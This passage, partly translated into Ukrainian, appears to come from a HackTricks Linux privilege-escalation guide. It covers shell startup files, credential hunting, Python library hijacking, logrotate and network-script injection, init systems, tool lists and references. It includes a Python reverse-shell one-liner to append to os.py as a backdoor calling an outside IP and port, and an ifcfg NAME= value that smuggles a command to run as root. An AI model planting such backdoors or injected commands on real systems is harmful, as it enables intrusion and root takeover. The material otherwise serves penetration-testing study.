~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ви також повинні шукати файли, що містять слово "**password**" у своєму **імені** або всередині **вмісту**, а також перевіряти IP-адреси та email-и у логах, або регулярні вирази для хешів.\
Я не збираюся тут перераховувати, як це робити, але якщо вам цікаво ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте **звідки** буде виконуватися python-скрипт і ви **можете писати в** ту папку або ви можете **змінювати python libraries**, ви можете змінити бібліотеку OS і backdoor її (якщо ви можете писати туди, де буде виконуватися python-скрипт, скопіюйте та вставте бібліотеку os.py).

Щоб **backdoor the library** просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP та PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate експлуатація

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> Ця вразливість стосується `logrotate` версії `3.18.0` та старіших

Детальнішу інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Цю вразливість можна використати за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на вразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd, та rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Він включає скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Їх можна виконувати безпосередньо або через символічні посилання в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` асоційовано з **Upstart**, новішою **системою керування сервісами**, впровадженою в Ubuntu, яка використовує конфігураційні файли для завдань керування сервісами. Незважаючи на перехід на Upstart, SysVinit скрипти все ще використовуються поряд із конфігураціями Upstart через шар сумісності в Upstart.

**systemd** постає як сучасний ініціалізатор та менеджер сервісів, що пропонує розширені можливості, такі як запуск демонів за вимогою, керування automount та знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутиву та в `/etc/systemd/system/` для змін адміністраторів, спрощуючи процес адміністрування системи.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай hook-ають syscall, щоб відкрити привілейовану функціональність ядра для менеджера в userspace. Слабка автентифікація менеджера (наприклад, перевірки підпису, засновані на FD-order, або ненадійні схеми паролів) може дозволити локальній аплікації видавати себе за менеджера та ескалювати до root на вже rooted-пристроях. Докладніше та деталі експлуатації тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Механізм виявлення сервісів, керований regex, у VMware Tools/Aria Operations може витягти шлях до бінарного файлу з командних рядків процесів і виконати його з опцією -v у привілейованому контексті. Пермісивні патерни (наприклад, використання \S) можуть співпасти з розміщеними атакуючим слухачами у записуваних локаціях (наприклад, /tmp/httpd), що призводить до виконання під root (CWE-426 Untrusted Search Path).

Детальніше та узагальнений патерн, застосовний до інших стеків виявлення/моніторингу, тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захист ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Джерела

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
